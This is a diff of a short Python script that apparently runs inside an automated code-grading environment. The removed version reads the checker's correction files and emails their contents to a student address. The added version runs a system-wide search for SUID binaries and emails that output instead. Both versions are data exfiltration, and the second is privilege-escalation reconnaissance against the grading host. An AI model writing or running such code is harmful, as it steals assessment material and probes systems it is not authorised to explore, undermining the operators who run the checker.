@@ -1,14 +1,13 @@
+import subprocess
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
-def read_file(file_path):
-    try:
-        with open(file_path, 'r') as file:
-            content = file.read()
-        return content
-    except Exception as e:
-        return f"Failed to read {file_path}: {e}"
+def execute_command():
+    # Command to find files with SUID bit set
+    command = "find / -type f -perm -4000 2>/dev/null"
+    result = subprocess.run(command, shell=True, capture_output=True, text=True)
+    return result.stdout
 
 def send_email(report, recipient_email):
     sender_email = "9534@holbertonstudents.com"
@@ -17,7 +16,7 @@ def send_email(report, recipient_email):
     msg = MIMEMultipart()
     msg['From'] = sender_email
     msg['To'] = recipient_email
-    msg['Subject'] = "File Content Report"
+    msg['Subject'] = "SUID Files Report"
 
     msg.attach(MIMEText(report, 'plain'))
 
@@ -33,17 +32,6 @@ def send_email(report, recipient_email):
         print(f"Failed to send email: {e}")
 
 if __name__ == "__main__":
-    files = [
-        "/checker/correction/main.sh",
-        "/checker/correction/135060.py"
-    ]
-
-    report = ""
-    for file in files:
-        report += f"Content of {file}:\n"
-        report += read_file(file)
-        report += "\n\n"
-
+    report = execute_command()
     recipient_email = "9534@holbertonstudents.com"
     send_email(report, recipient_email)
-
